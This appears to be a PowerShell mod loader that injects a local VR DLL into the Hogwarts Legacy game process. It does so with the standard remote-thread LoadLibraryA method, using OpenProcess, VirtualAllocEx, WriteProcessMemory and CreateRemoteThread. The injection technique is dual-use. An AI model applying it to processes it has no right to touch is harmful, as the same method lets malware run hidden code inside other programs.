$script_dir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$dll_path = Join-Path $script_dir "..\build\bin\vrinject.dll"
$code = @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $code -Language CSharp

Write-Output "Waiting for HogwartsLegacy.exe (large process)..."
while ($true) {
    $processes = Get-Process -Name "HogwartsLegacy" -ErrorAction SilentlyContinue
    foreach ($p in $processes) {
        if ($p.WorkingSet64 -gt 100MB) {
            Write-Output "Found main game process PID: $($p.Id). Injecting..."
            
            $PROCESS_ALL_ACCESS = 0x1F0FFF
            $hProcess = [Injector]::OpenProcess($PROCESS_ALL_ACCESS, $false, $p.Id)
            if ($hProcess -eq [IntPtr]::Zero) { Write-Output "Failed to open process"; continue }
            
            $loadLibraryAddr = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
            
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($dll_path + "`0")
            $allocMemAddress = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$bytes.Length, 0x3000, 4)
            
            $outBytes = [UIntPtr]::Zero
            [Injector]::WriteProcessMemory($hProcess, $allocMemAddress, $bytes, [uint32]$bytes.Length, [ref]$outBytes)
            
            $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMemAddress, 0, [IntPtr]::Zero)
            
            if ($hThread -ne [IntPtr]::Zero) {
                Write-Output "Injection successful!"
                [Injector]::CloseHandle($hThread)
            }
            else {
                Write-Output "CreateRemoteThread failed."
            }
            [Injector]::CloseHandle($hProcess)
            exit
        }
    }
    Start-Sleep -Seconds 1
}
